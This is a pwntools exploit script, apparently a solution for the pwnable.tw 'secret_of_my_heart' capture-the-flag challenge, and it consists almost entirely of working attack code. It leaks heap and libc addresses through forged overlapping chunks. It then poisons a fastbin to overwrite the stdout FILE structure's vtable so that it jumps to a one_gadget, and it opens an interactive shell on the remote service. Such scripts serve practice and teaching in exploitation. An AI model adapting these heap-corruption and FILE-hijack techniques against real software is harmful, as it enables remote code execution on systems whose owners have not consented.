#!/usr/bin/env python3
from pwn import *

#p = process('./secret_of_my_heart')
p = remote('chall.pwnable.tw', 10302)
libc= ELF('./lib/libc.so.6')

#context.log_level = 'debug'
context.terminal = ['tmux', 'new-window']

if 'container' in open('/proc/1/cgroup', 'r').read():
    context.terminal = ['tmux', 'new-window']

def add(size, name, secret, sh=False):
	p.sendlineafter(b'Your choice :', b'1')
	p.sendlineafter(b'Size of heart : ', str(size).encode())
	p.sendafter(b'Name of heart', name)
	p.sendafter(b'secret of my heart', secret)

def show(idx):
	p.sendlineafter(b'Your choice :', b'2')
	p.sendlineafter(b'Index :', str(idx).encode())

def _del(idx):
	p.sendlineafter(b'Your choice :', b'3')
	p.sendlineafter(b'Index :', str(idx).encode())

add(0x68, b'a' * 0x20, b'a')
show(0)

p.recvuntil(b'a' * 0x20)
heap = u64(p.recv(6).ljust(8, b'\x00')) & ~0xfff

print("heap -> ", hex(heap))

add(0xf0, b'a', b'a')
add(0x10, b'a', b'a')

_del(0)

# overlapping chunks to get libc in fd
pl = flat(
	p64(heap + 0x8),
	p64(heap + 0x10),
	p64(heap), 
	p64(0) * 9,
	p64(0x70)
)

add(0x68, b'a', pl)
_del(1)
show(0)

p.recvuntil(b'Secret : ')
libc.address = u64(p.recv(6).ljust(8, b'\x00')) - 0x3c3b78
og = libc.address + 0xf0567

print("libc -> ", hex(libc.address))

add(0x68, b'a', b'a')
add(0x68, b'a', b'a')

_del(0)
_del(3)
_del(1)

add(0x68, b'a', p64(libc.sym['_IO_2_1_stdout_'] + 216 - 0x3b))
add(0x68, b'a', b'a')
add(0x68, b'a', b'a')

add(0x100, b'a', p64(og) * (0x98 // 8))

pl = flat(
	p64(0) * 2, p8(0) * 3,
	p32(0xffffffff), p8(0),
	p64(0), p32(0), p8(0) * 7,
	p64(heap + 0x1a0) 
)

add(0x68, b'\x00' * 0x20, pl)

p.interactive()
